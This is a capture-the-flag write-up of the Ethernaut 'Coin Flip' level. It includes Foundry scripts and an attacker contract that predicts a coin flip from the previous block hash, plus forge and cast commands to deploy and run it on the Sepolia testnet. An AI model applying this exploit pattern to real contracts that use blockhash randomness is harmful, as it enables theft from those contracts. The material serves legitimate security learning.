---
title: Coin Flip
---

Difficulty: ⭐⭐
Date: 31 janvier 2024
État: Terminé

This is a coin
flipping game where you need to build up your winning streak by guessing
the outcome of a coin flip. To complete this level you'll need to use
your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above in the top right corner menu, section "Beyond the console"

Here is the first version of my solution:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface CoinFlip {
  function consecutiveWins() external returns (uint256);
  function flip(bool _guess) external returns (bool);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_03");
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.startBroadcast(deployerPrivateKey);
        CoinFlip instance = CoinFlip(addr);

        for (uint i = 0; i < 10; i++) {
          uint256 blockValue = uint256(blockhash(block.number - 1));
          uint coinFlip = blockValue / FACTOR;
          bool side = coinFlip == 1 ? true : false;
          instance.flip(side);
          console.logUint(instance.consecutiveWins());
       }

        vm.stopBroadcast();
    }
}
```

It doesn’t work because block.number doesn’t change between executionn of the loop.

[https://github.com/foundry-rs/foundry/issues/5840](https://github.com/foundry-rs/foundry/issues/5840)

It seems that theire is on way to do this so let’s go by hand for now…

Here is the forge script:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface CoinFlip {
  function consecutiveWins() external returns (uint256);
  function flip(bool _guess) external returns (bool);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_03");
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.startBroadcast(deployerPrivateKey);
        CoinFlip instance = CoinFlip(addr);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);
        console.logUint(instance.consecutiveWins());

        vm.stopBroadcast();
    }
}
```

Actually this is too complecated. So let’s build a contract that will do th attack for us with check in it so that we are sure to get a valid result.

here is my attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
  function consecutiveWins() external returns (uint256);
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlipTarget;

  constructor(address instanceAdrress) {
    coinFlipTarget = CoinFlip(instanceAdrress);
    consecutiveWins = 0;
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    if (lastHash != blockValue) {
      lastHash = blockValue;
      uint256 coinFlip = blockValue / FACTOR;
      bool side = coinFlip == 1 ? true : false;
      coinFlipTarget.flip(side);
      consecutiveWins++;
    }
  }
}
```

Let’s deploy this contract :

```solidity
forge create --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY src/03.sol:CoinFlipAttack --constructor-args $INSTANCE_03
```

Now we can call our `attack()` function with cast send:

```solidity
cast send $ATTACKER_03 --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY "attack()"
```

We can also look up the current consecutive wins on the attacked contract using the following cast command:

```solidity
cast call $INSTANCE_03 --rpc-url $SEPOLIA_RPC_URL "consecutiveWins()"
```
